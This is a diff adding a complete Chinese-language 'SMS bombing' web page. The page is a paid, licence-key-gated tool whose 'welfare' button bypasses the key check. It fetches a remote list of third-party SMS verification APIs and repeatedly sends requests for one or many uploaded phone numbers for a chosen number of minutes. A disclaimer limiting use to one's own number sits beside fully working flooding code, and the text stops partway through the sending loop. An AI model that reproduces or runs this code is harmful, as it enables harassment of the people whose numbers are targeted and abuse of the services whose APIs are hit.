@@ -1,0 +1,1253 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>短信轰炸</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        #app {
+            width: 100%;
+            max-width: 420px;
+            height: 100vh;
+            max-height: 820px;
+            background: #000;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8);
+        }
+
+        /* ===== 页面容器 ===== */
+        .page {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            padding: 20px 16px 16px;
+            overflow-y: auto;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+        }
+        .page.active {
+            display: flex;
+        }
+
+        /* ===== 卡密验证页 ===== */
+        #page-verify {
+            justify-content: center;
+            align-items: center;
+            padding: 30px 24px;
+        }
+        #page-verify .title {
+            font-size: 30px;
+            font-weight: 700;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 40px;
+            letter-spacing: 1px;
+        }
+        #page-verify .input-wrap {
+            width: 100%;
+            background: #2a2a2a;
+            border-radius: 10px;
+            border: 1px solid #444;
+            padding: 0 12px;
+            margin-bottom: 24px;
+        }
+        #page-verify .input-wrap input {
+            width: 100%;
+            height: 48px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 16px;
+            padding: 0 4px;
+        }
+        #page-verify .input-wrap input::placeholder {
+            color: #888;
+        }
+        #page-verify .btn-submit {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #007aff;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        #page-verify .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        #page-verify .btn-buy {
+            background: transparent;
+            border: none;
+            color: #00cccc;
+            font-size: 15px;
+            margin-top: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        #page-verify .status {
+            margin-top: 18px;
+            font-size: 14px;
+            color: #aaa;
+            text-align: center;
+            min-height: 44px;
+            line-height: 1.5;
+            word-break: break-all;
+        }
+        #page-verify .status.success {
+            color: #00e660;
+        }
+        #page-verify .status.error {
+            color: #ff3b30;
+        }
+        #page-verify .spinner {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #333;
+            border-top-color: #007aff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 6px auto 0;
+        }
+        #page-verify .spinner.active {
+            display: block;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ===== 公益页 ===== */
+        #page-welfare {
+            justify-content: center;
+            align-items: center;
+            padding: 30px 24px;
+            text-align: center;
+        }
+        #page-welfare .welfare-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        #page-welfare .welfare-sub {
+            font-size: 16px;
+            color: #aaa;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+        #page-welfare .btn-confirm {
+            width: 200px;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #007aff;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        #page-welfare .btn-tg {
+            width: 200px;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #009999;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* ===== 主界面 ===== */
+        #page-main {
+            padding: 12px 16px 8px;
+        }
+        #page-main .main-title {
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            padding: 8px 0 12px;
+            color: #fff;
+        }
+        #page-main .phone-wrap {
+            background: #1c1c1e;
+            border-radius: 10px;
+            border: 1px solid #333;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            margin-bottom: 10px;
+            height: 46px;
+        }
+        #page-main .phone-wrap input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 16px;
+            height: 100%;
+            padding: 0 4px;
+        }
+        #page-main .phone-wrap input::placeholder {
+            color: #666;
+        }
+        #page-main .phone-wrap .eye {
+            background: transparent;
+            border: none;
+            color: #888;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0 4px;
+            line-height: 1;
+        }
+        #page-main .row-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+        }
+        #page-main .row-actions .btn-upload {
+            background: #2c6b2c;
+            border: none;
+            color: #fff;
+            padding: 0 16px;
+            height: 34px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        #page-main .row-actions .file-label {
+            font-size: 12px;
+            color: #888;
+            flex: 1;
+            min-width: 60px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        #page-main .row-actions .file-label.loaded {
+            color: #00e660;
+        }
+        #page-main .row-settings {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        #page-main .row-settings label {
+            font-size: 15px;
+            color: #aaa;
+        }
+        #page-main .row-settings input[type="number"] {
+            width: 64px;
+            height: 32px;
+            background: #1c1c1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: #fff;
+            text-align: center;
+            font-size: 14px;
+            outline: none;
+        }
+        #page-main .row-settings .btn-tg {
+            background: #009999;
+            border: none;
+            color: #fff;
+            padding: 0 16px;
+            height: 32px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        #page-main .btn-start {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #007aff;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 8px;
+            transition: background 0.2s;
+        }
+        #page-main .btn-start:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        #page-main .btn-pause {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #ff9500;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 8px;
+            display: none;
+        }
+        #page-main .status-bar {
+            font-size: 13px;
+            color: #aaa;
+            text-align: center;
+            min-height: 22px;
+            padding: 4px 0;
+            line-height: 1.4;
+        }
+        #page-main .status-bar.running {
+            color: #5ac8fa;
+        }
+        #page-main .status-bar.done {
+            color: #00e660;
+        }
+        #page-main .status-bar.error {
+            color: #ff3b30;
+        }
+        #page-main .log-area {
+            flex: 1;
+            min-height: 120px;
+            background: #0c0c0d;
+            border-radius: 8px;
+            padding: 8px 10px;
+            overflow-y: auto;
+            font-family: "Menlo", "Consolas", monospace;
+            font-size: 11px;
+            color: #00cc00;
+            line-height: 1.6;
+            margin-top: 4px;
+            border: 1px solid #1a1a1a;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 300px;
+        }
+        #page-main .log-area::-webkit-scrollbar {
+            width: 4px;
+        }
+        #page-main .log-area::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+        #page-main .log-area .log-time {
+            color: #555;
+        }
+
+        /* ===== 隐藏文件输入 ===== */
+        #file-input {
+            display: none;
+        }
+
+        /* ===== 滚动条 ===== */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+
+        /* ===== 响应式 ===== */
+        @media (max-width: 440px) {
+            #app {
+                max-height: 100vh;
+                border-radius: 0;
+            }
+            #page-main .log-area {
+                max-height: 200px;
+            }
+        }
+        @media (min-height: 780px) {
+            #page-main .log-area {
+                max-height: 360px;
+            }
+        }
+
+        /* ===== Toast ===== */
+        .toast {
+            position: fixed;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(30, 30, 30, 0.95);
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 10px;
+            font-size: 14px;
+            z-index: 999;
+            border: 1px solid #333;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.3s;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== Toast ===== -->
+    <div id="toast" class="toast"></div>
+
+    <div id="app">
+
+        <!-- ==================== 卡密验证页 ==================== -->
+        <div id="page-verify" class="page active">
+            <div class="title">🔐 卡密验证</div>
+            <div class="input-wrap">
+                <input type="text" id="card-input" placeholder="请输入卡密" autocomplete="off" spellcheck="false">
+            </div>
+            <button class="btn-submit" id="btn-verify">提交验证</button>
+            <button class="btn-buy" id="btn-buy">前往卡网购买卡密</button>
+            <div class="status" id="verify-status"></div>
+            <div class="spinner" id="verify-spinner"></div>
+        </div>
+
+        <!-- ==================== 公益页 ==================== -->
+        <div id="page-welfare" class="page">
+            <div class="welfare-title">❤️ 公益中</div>
+            <div class="welfare-sub">你好欢迎使用<br>本工具仅供自己号码测试￼切记骚扰他人￼</div>
+            <button class="btn-confirm" id="btn-welfare-confirm">确定</button>
+            <button class="btn-tg" id="btn-welfare-tg">✈️ 加入TG</button>
+        </div>
+
+        <!-- ==================== 主界面 ==================== -->
+        <div id="page-main" class="page">
+            <div class="main-title">💣 短信测压</div>
+
+            <div class="phone-wrap">
+                <input type="password" id="phone-input" placeholder="手机号（可选）" inputmode="numeric">
+                <button class="eye" id="btn-eye">👁</button>
+            </div>
+
+            <div class="row-actions">
+                <button class="btn-upload" id="btn-upload">📂 上传txt号码</button>
+                <span class="file-label" id="file-label">未加载批量号码</span>
+                <input type="file" id="file-input" accept=".txt">
+            </div>
+
+            <div class="row-settings">
+                <label>持续分钟:</label>
+                <input type="number" id="minute-input" value="1" min="1" max="9999">
+                <button class="btn-tg" id="btn-main-tg">✈️ TG</button>
+            </div>
+
+            <button class="btn-start" id="btn-start">开始轰炸</button>
+            <button class="btn-pause" id="btn-pause">暂停</button>
+
+            <div class="status-bar" id="status-bar"></div>
+
+            <div class="log-area" id="log-area"></div>
+        </div>
+
+    </div>
+
+    <script>
+        // ================================================================
+        // ======================== 工具函数 ================================
+        // ================================================================
+
+        // ---- Toast ----
+        let toastTimer = null;
+
+        function showToast(msg) {
+            const el = document.getElementById('toast');
+            el.textContent = msg;
+            el.classList.add('show');
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => el.classList.remove('show'), 3000);
+        }
+
+        // ---- 日志 ----
+        const logArea = document.getElementById('log-area');
+
+        function appendLog(msg, phone) {
+            let display = msg;
+            if (phone && phone.length >= 2) {
+                const hidden = '**' + phone.slice(-2);
+                display = msg.replace(new RegExp(phone, 'g'), hidden);
+            }
+            const now = new Date();
+            const time = String(now.getHours()).padStart(2, '0') + ':' +
+                String(now.getMinutes()).padStart(2, '0') + ':' +
+                String(now.getSeconds()).padStart(2, '0');
+            const line = '[' + time + '] ' + display + '\n';
+            logArea.textContent += line;
+            if (logArea.textContent.length > 8000) {
+                logArea.textContent = logArea.textContent.slice(4000);
+            }
+            logArea.scrollTop = logArea.scrollHeight;
+        }
+
+        // ---- 页面切换 ----
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ---- 随机ID (替代UUID) ----
+        function getDeviceId() {
+            let id = localStorage.getItem('device_id');
+            if (!id) {
+                id = 'dev_' + Math.random().toString(36).slice(2, 10) + '_' + Date.now().toString(36);
+                localStorage.setItem('device_id', id);
+            }
+            return id;
+        }
+
+        // ---- SHA256 (Web Crypto) ----
+        async function sha256Hex(input) {
+            const enc = new TextEncoder();
+            const data = enc.encode(input);
+            const buf = await crypto.subtle.digest('SHA-256', data);
+            const arr = new Uint8Array(buf);
+            return Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // ---- Base64 ----
+        function b64encode(data) {
+            return btoa(String.fromCharCode.apply(null, data));
+        }
+
+        function b64decode(str) {
+            const bin = atob(str);
+            const arr = new Uint8Array(bin.length);
+            for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+            return arr;
+        }
+
+        // ================================================================
+        // ======================== ChaCha20 ===============================
+        // ================================================================
+
+        function chacha20QuarterRound(state, a, b, c, d) {
+            state[a] = (state[a] + state[b]) >>> 0;
+            state[d] = ((state[d] ^ state[a]) << 16) >>> 0 | ((state[d] ^ state[a]) >>> 16);
+            state[c] = (state[c] + state[d]) >>> 0;
+            state[b] = ((state[b] ^ state[c]) << 12) >>> 0 | ((state[b] ^ state[c]) >>> 20);
+            state[a] = (state[a] + state[b]) >>> 0;
+            state[d] = ((state[d] ^ state[a]) << 8) >>> 0 | ((state[d] ^ state[a]) >>> 24);
+            state[c] = (state[c] + state[d]) >>> 0;
+            state[b] = ((state[b] ^ state[c]) << 7) >>> 0 | ((state[b] ^ state[c]) >>> 25);
+        }
+
+        function chacha20Block(key, nonce, counter) {
+            const constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
+            const state = new Uint32Array(16);
+            state.set(constants);
+            for (let i = 0; i < 8; i++) {
+                state[4 + i] = (key[i * 4]) | (key[i * 4 + 1] << 8) | (key[i * 4 + 2] << 16) | (key[i * 4 + 3] << 24);
+            }
+            state[12] = counter >>> 0;
+            state[13] = (nonce[0]) | (nonce[1] << 8) | (nonce[2] << 16) | (nonce[3] << 24);
+            state[14] = (nonce[4]) | (nonce[5] << 8) | (nonce[6] << 16) | (nonce[7] << 24);
+            state[15] = (nonce[8]) | (nonce[9] << 8) | (nonce[10] << 16) | (nonce[11] << 24);
+
+            const working = new Uint32Array(state);
+            for (let i = 0; i < 10; i++) {
+                chacha20QuarterRound(working, 0, 4, 8, 12);
+                chacha20QuarterRound(working, 1, 5, 9, 13);
+                chacha20QuarterRound(working, 2, 6, 10, 14);
+                chacha20QuarterRound(working, 3, 7, 11, 15);
+                chacha20QuarterRound(working, 0, 5, 10, 15);
+                chacha20QuarterRound(working, 1, 6, 11, 12);
+                chacha20QuarterRound(working, 2, 7, 8, 13);
+                chacha20QuarterRound(working, 3, 4, 9, 14);
+            }
+            const out = new Uint8Array(64);
+            for (let i = 0; i < 16; i++) {
+                const val = (state[i] + working[i]) >>> 0;
+                out[i * 4] = val & 0xff;
+                out[i * 4 + 1] = (val >> 8) & 0xff;
+                out[i * 4 + 2] = (val >> 16) & 0xff;
+                out[i * 4 + 3] = (val >> 24) & 0xff;
+            }
+            return out;
+        }
+
+        function chacha20Crypt(input, key, nonce) {
+            const inputBytes = (input instanceof Uint8Array) ? input : new Uint8Array(input);
+            const out = new Uint8Array(inputBytes.length);
+            let counter = 0;
+            let pos = 0;
+            while (pos < inputBytes.length) {
+                const block = chacha20Block(key, nonce, counter);
+                const chunk = Math.min(inputBytes.length - pos, 64);
+                for (let i = 0; i < chunk; i++) {
+                    out[pos + i] = inputBytes[pos + i] ^ block[i];
+                }
+                pos += chunk;
+                counter++;
+            }
+            return out;
+        }
+
+        // ================================================================
+        // ======================== 卡密验证 ================================
+        // ================================================================
+
+        const CARD_ID = '1021';
+        const CARD_APPID = '97d049a31f4c4027fb895cbb6f60b8fd';
+        const CHACHA20_KEY_LEN = 32;
+        const CHACHA20_NONCE_LEN = 12;
+        const MAX_TIMESTAMP_DIFF = 5;
+        const VERIFY_URLS = [
+            'https://card.ais666.cn/verifyKey/v2',
+            'http://card.ais666.cn/verifyKey/v2'
+        ];
+        const SAVED_CARD_KEY = 'savedCardKey';
+
+        function generateKey() {
+            const key = new Uint8Array(CHACHA20_KEY_LEN);
+            const appidBytes = new TextEncoder().encode(CARD_APPID);
+            const len = Math.min(appidBytes.length, CHACHA20_KEY_LEN);
+            key.set(appidBytes.slice(0, len));
+            if (len < CHACHA20_KEY_LEN) {
+                for (let i = len; i < CHACHA20_KEY_LEN; i++) key[i] = 0x30;
+            }
+            return key;
+        }
+
+        function encryptPlaintext(plaintext, key) {
+            const plainBytes = new TextEncoder().encode(plaintext);
+            const nonce = crypto.getRandomValues(new Uint8Array(CHACHA20_NONCE_LEN));
+            const cipher = chacha20Crypt(plainBytes, key, nonce);
+            const nonceB64 = b64encode(nonce);
+            const cipherB64 = b64encode(cipher);
+            return nonceB64 + '.' + cipherB64;
+        }
+
+        function decryptData(encrypted, key) {
+            const parts = encrypted.split('.');
+            if (parts.length !== 2) throw new Error('加密数据格式错误');
+            const nonce = b64decode(parts[0]);
+            const cipher = b64decode(parts[1]);
+            if (nonce.length !== CHACHA20_NONCE_LEN) throw new Error('Nonce长度错误');
+            const plain = chacha20Crypt(cipher, key, nonce);
+            return new TextDecoder().decode(plain);
+        }
+
+        async function verifyCard(code) {
+            const uuid = getDeviceId();
+            const timestamp = Math.floor(Date.now() / 1000);
+            const now = Date.now() / 1000;
+            if (Math.abs(now - timestamp) > MAX_TIMESTAMP_DIFF) {
+                throw new Error('系统时间异常，请检查设备时间设置');
+            }
+
+            const signStr = timestamp + code + uuid + CARD_ID + CARD_APPID;
+            const sign = await sha256Hex(signStr);
+
+            const reqObj = { code, uuid, timestamp: timestamp.toString(), sign, sign_type: 'sha256' };
+            const reqJson = JSON.stringify(reqObj);
+
+            const key = generateKey();
+            const encryptedData = encryptPlaintext(reqJson, key);
+            const encodedData = encodeURIComponent(encryptedData);
+            const postBody = 'id=' + CARD_ID + '&appid=' + CARD_APPID + '&data=' + encodedData;
+
+            let lastError = null;
+            for (const url of VERIFY_URLS) {
+                try {
+                    const resp = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'KeyVerifier/1.0'
+                        },
+                        body: postBody
+                    });
+                    if (!resp.ok) {
+                        lastError = new Error('服务器错误: ' + resp.status);
+                        continue;
+                    }
+                    const respData = await resp.json();
+
+                    let finalData = respData;
+                    if (typeof respData.data === 'string') {
+                        const decrypted = decryptData(respData.data, key);
+                        finalData = JSON.parse(decrypted);
+                    }
+
+                    if (!finalData.success) {
+                        throw new Error(finalData.message || '验证失败');
+                    }
+
+                    // 校验
+                    const sTs = finalData.usertime;
+                    const sCode = finalData.code;
+                    const sUuid = finalData.uuid;
+                    const sCheck = finalData.check;
+                    if (!sTs || !sCode || !sUuid || !sCheck) {
+                        throw new Error('响应完整性数据缺失');
+                    }
+                    if (sCode !== code) throw new Error('卡密不匹配');
+                    if (sUuid !== uuid) throw new Error('设备标识不匹配');
+                    const sTime = parseFloat(sTs);
+                    if (Math.abs(Date.now() / 1000 - sTime) > MAX_TIMESTAMP_DIFF) {
+                        throw new Error('时间戳校验失败');
+                    }
+                    const checkStr = sTs + code + uuid;
+                    const expectedSign = await sha256Hex(checkStr);
+                    if (expectedSign !== sCheck) {
+                        throw new Error('响应签名校验失败');
+                    }
+
+                    return { success: true, message: finalData.message || '验证成功', expiry: finalData.expiry || null };
+                } catch (e) {
+                    lastError = e;
+                }
+            }
+            throw lastError || new Error('网络请求失败');
+        }
+
+        // ================================================================
+        // ======================== QQ收藏检测 =============================
+        // ================================================================
+
+        const QQ_COLLECTION_URL = 'https://sharechain.qq.com/de8735848362e53114c723cb5b5957d0?qq_aio_chat_type=2';
+        const QQ_LINK_FOR_API = 'https://sharechain.qq.com/d17ee779df41b5f90653963de780ca0a?qq_aio_chat_type=2';
+        const TG_URL = 'https://t.me/ioshace';
+
+        async function fetchQQPlainText(url) {
+            const resp = await fetch(url, {
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'
+                }
+            });
+            if (!resp.ok) throw new Error('网络请求失败');
+            const html = await resp.text();
+            // 简单提取纯文本
+            const div = document.createElement('div');
+            div.innerHTML = html;
+            return div.textContent || html;
+        }
+
+        function extractApiUrlFromHtml(html) {
+            const match = html.match(/https:\/\/raw\.githubusercontent\.com\/[^\s"'\u4e00-\u9fa5<>]+/);
+            if (match) return match[0];
+            const match2 = html.match(/https?:\/\/[^\s"'\u4e00-\u9fa5<>]+\.jsno/);
+            if (match2) return match2[0];
+            return null;
+        }
+
+        // ================================================================
+        // ======================== API 加载 ===============================
+        // ================================================================
+
+        let g_cachedApis = null;
+
+        async function loadAPIsFromQQLink() {
+            if (g_cachedApis) return g_cachedApis;
+            try {
+                const html = await fetchQQPlainText(QQ_LINK_FOR_API);
+                const apiUrl = extractApiUrlFromHtml(html);
+                if (!apiUrl) throw new Error('未找到接口');
+                const resp = await fetch(apiUrl, { headers: { 'Accept': 'application/json' } });
+                if (!resp.ok) throw new Error('接口服务器返回 HTTP ' + resp.status);
+                const data = await resp.json();
+                if (!Array.isArray(data)) throw new Error('接口数据格式错误，应为 JSON 数组');
+                g_cachedApis = data;
+                return g_cachedApis;
+            } catch (e) {
+                throw new Error('加载接口失败: ' + e.message);
+            }
+        }
+
+        // ================================================================
+        // ======================== 网络请求 ===============================
+        // ================================================================
+
+        function sendRequestWithAPI(api, phone) {
+            return new Promise((resolve) => {
+                let url = api.url || '';
+                let method = api.method || 'GET';
+                let data = api.data || {};
+                const header = api.header || {};
+
+                url = url.replace(/\[phone\]/g, phone);
+                let bodyData = null;
+                let contentType = null;
+
+                if (typeof data === 'object' && data !== null && !Array.isArray(data)) {
+                    const newData = {};
+                    for (const k of Object.keys(data)) {
+                        let v = data[k];
+                        if (typeof v === 'string') v = v.replace(/\[phone\]/g, phone);
+                        newData[k] = v;
+                    }
+                    data = newData;
+                    if (method.toUpperCase() === 'POST') {
+                        const pairs = [];
+                        for (const k of Object.keys(data)) {
+                            const val = encodeURIComponent(data[k]);
+                            pairs.push(k + '=' + val);
+                        }
+                        bodyData = pairs.join('&');
+                        contentType = 'application/x-www-form-urlencoded';
+                    }
+                } else if (typeof data === 'string') {
+                    bodyData = data.replace(/\[phone\]/g, phone);
+                }
+
+                const reqInit = {
+                    method: method.toUpperCase(),
+                    headers: { ...header }
+                };
+                if (bodyData) {
+                    reqInit.body = bodyData;
+                    if (contentType) reqInit.headers['Content-Type'] = contentType;
+                }
+
+                fetch(url, reqInit)
+                    .then(resp => {
+                        if (resp.status >= 200 && resp.status < 300) {
+                            resolve({ success: true, message: '成功(' + resp.status + ')' });
+                        } else {
+                            resolve({ success: false, message: '状态码' + resp.status });
+                        }
+                    })
+                    .catch(() => {
+                        resolve({ success: false, message: '网络错误' });
+                    });
+            });
+        }
+
+        // ================================================================
+        // ======================== 主控制器 ===============================
+        // ================================================================
+
+        // ---- DOM 引用 ----
+        const pageVerify = document.getElementById('page-verify');
+        const pageWelfare = document.getElementById('page-welfare');
+        const pageMain = document.getElementById('page-main');
+
+        const cardInput = document.getElementById('card-input');
+        const btnVerify = document.getElementById('btn-verify');
+        const btnBuy = document.getElementById('btn-buy');
+        const verifyStatus = document.getElementById('verify-status');
+        const verifySpinner = document.getElementById('verify-spinner');
+
+        const phoneInput = document.getElementById('phone-input');
+        const btnEye = document.getElementById('btn-eye');
+        const btnUpload = document.getElementById('btn-upload');
+        const fileInput = document.getElementById('file-input');
+        const fileLabel = document.getElementById('file-label');
+        const minuteInput = document.getElementById('minute-input');
+        const btnMainTg = document.getElementById('btn-main-tg');
+        const btnStart = document.getElementById('btn-start');
+        const btnPause = document.getElementById('btn-pause');
+        const statusBar = document.getElementById('status-bar');
+
+        const btnWelfareConfirm = document.getElementById('btn-welfare-confirm');
+        const btnWelfareTg = document.getElementById('btn-welfare-tg');
+
+        // ---- 状态 ----
+        let isPhoneVisible = false;
+        let isPaused = false;
+        let sendTimer = null;
+        let totalSuccess = 0;
+        let totalFail = 0;
+        let targetPhones = [];
+        let isRunning = false;
+        let elapsedSeconds = 0;
+        let totalSeconds = 0;
+
+        // ---- 眼睛切换 ----
+        btnEye.addEventListener('click', () => {
+            isPhoneVisible = !isPhoneVisible;
+            phoneInput.type = isPhoneVisible ? 'text' : 'password';
+            btnEye.textContent = isPhoneVisible ? '🙈' : '👁';
+        });
+
+        // ---- 上传文件 ----
+        btnUpload.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', function(e) {
+            const file = this.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                const content = ev.target.result;
+                const lines = content.split(/\r?\n/);
+                const nums = [];
+                for (const line of lines) {
+                    const trimmed = line.trim();
+                    const digits = trimmed.replace(/\D/g, '');
+                    if (digits.length === 11 && digits.startsWith('1')) {
+                        nums.push(digits);
+                    }
+                }
+                if (nums.length === 0) {
+                    fileLabel.textContent = '❌ 未找到有效手机号';
+                    fileLabel.className = 'file-label';
+                    showToast('未找到有效手机号');
+                    return;
+                }
+                targetPhones = nums;
+                fileLabel.textContent = '✅ 已加载 ' + nums.length + ' 个号码';
+                fileLabel.className = 'file-label loaded';
+                appendLog('📂 上传文件成功，共 ' + nums.length + ' 个号码');
+                showToast('已加载 ' + nums.length + ' 个号码');
+            };
+            reader.readAsText(file);
+            this.value = '';
+        });
+
+        // ---- TG ----
+        btnMainTg.addEventListener('click', () => {
+            window.open(TG_URL, '_blank');
+        });
+        btnWelfareTg.addEventListener('click', () => {
+            window.open(TG_URL, '_blank');
+        });
+
+        // ---- 卡网 ----
+        btnBuy.addEventListener('click', () => {
+            window.open('https://xt.lqfaka.com/shop/U1W20W9F', '_blank');
+        });
+
+        // ---- 卡密验证 ----
+        async function doVerify() {
+            const code = cardInput.value.trim();
+            if (!code) {
+                verifyStatus.textContent = '❌ 请输入卡密';
+                verifyStatus.className = 'status error';
+                return;
+            }
+            btnVerify.disabled = true;
+            verifySpinner.classList.add('active');
+            verifyStatus.textContent = '验证中...';
+            verifyStatus.className = 'status';
+
+            try {
+                const result = await verifyCard(code);
+                localStorage.setItem(SAVED_CARD_KEY, code);
+                verifyStatus.textContent = '✅ ' + result.message + (result.expiry ? '\n到期时间: ' + result.expiry : '');
+                verifyStatus.className = 'status success';
+                setTimeout(() => {
+                    showPage('page-main');
+                    initMain();
+                }, 600);
+            } catch (e) {
+                verifyStatus.textContent = '❌ ' + e.message;
+                verifyStatus.className = 'status error';
+            } finally {
+                btnVerify.disabled = false;
+                verifySpinner.classList.remove('active');
+            }
+        }
+
+        btnVerify.addEventListener('click', doVerify);
+        cardInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') doVerify();
+        });
+
+        // ---- ★ 修正：公益页确定 → 直接进入主界面（跳过卡密验证） ----
+        btnWelfareConfirm.addEventListener('click', () => {
+            // 公益模式直接进入主界面，不再弹出卡密验证
+            showPage('page-main');
+            initMain();
+        });
+
+        // ---- 主界面初始化 ----
+        async function initMain() {
+            // 清空日志
+            logArea.textContent = '';
+            statusBar.textContent = '';
+            statusBar.className = 'status-bar';
+            btnStart.style.display = 'block';
+            btnPause.style.display = 'none';
+            isRunning = false;
+            isPaused = false;
+            totalSuccess = 0;
+            totalFail = 0;
+            elapsedSeconds = 0;
+
+            // 加载API
+            appendLog('⏳ 正在加载接口...');
+            try {
+                const apis = await loadAPIsFromQQLink();
+                appendLog('✅ 接口加载成功，共 ' + apis.length + ' 个接口');
+            } catch (e) {
+                appendLog('❌ ' + e.message);
+                statusBar.textContent = '❌ 接口加载失败，请检查网络';
+                statusBar.className = 'status-bar error';
+            }
+        }
+
+        // ---- 开始轰炸 ----
+        btnStart.addEventListener('click', startBombing);
+
+        async function startBombing() {
+            if (isRunning) return;
+
+            let apis = g_cachedApis;
+            if (!apis || apis.length === 0) {
+                try {
+                    apis = await loadAPIsFromQQLink();
+                } catch (e) {
+                    statusBar.textContent = '❌ 接口未加载，请检查网络';
+                    statusBar.className = 'status-bar error';
+                    showToast('接口加载失败');
+                    return;
+                }
+            }
+            if (!apis || apis.length === 0) {
+                statusBar.textContent = '❌ 接口加载失败';
+                statusBar.className = 'status-bar error';
+                return;
+            }
+
+            // 获取目标号码
+            let phones = [];
+            if (targetPhones.length > 0) {
+                phones = targetPhones.slice();
+            } else {
+                const phone = phoneInput.value.trim();
+                if (phone.length !== 11 || !phone.startsWith('1')) {
+                    statusBar.textContent = '❌ 请输入11位手机号或上传txt';
+                    statusBar.className = 'status-bar error';
+                    showToast('请输入11位手机号');
+                    return;
+                }
+                phones = [phone];
+            }
+
+            const minutes = parseInt(minuteInput.value) || 1;
+            if (minutes < 1 || minutes > 9999) {
+                showToast('分钟数范围 1-9999');
+                return;
+            }
+
+            // 重置状态
+            isRunning = true;
+            isPaused = false;
+            totalSuccess = 0;
+            totalFail = 0;
+            elapsedSeconds = 0;
+            totalSeconds = minutes * 60;
+
+            btnStart.style.display = 'none';
+            btnPause.style.display = 'block';
+            btnPause.textContent = '暂停';
+
+            statusBar.textContent = '⏳ 轰炸进行中，持续 ' + minutes + ' 分钟，共 ' + phones.length + ' 个号码';
+            statusBar.className = 'status-bar running';
+            appendLog('📱 目标号码 ' + phones.length + ' 个');
+            phones.forEach(p => appendLog('📱 号码: ' + p, p));
+
+            // 执行一轮
+            const sendOneRound = async () => {
+                for (const phone of phones) {
+                    for (const api of apis) {
+                        try {
+                            const result = await sendRequestWithAPI(api, phone);
+                            if (result.success) totalSuccess++;
+                            else totalFail++;
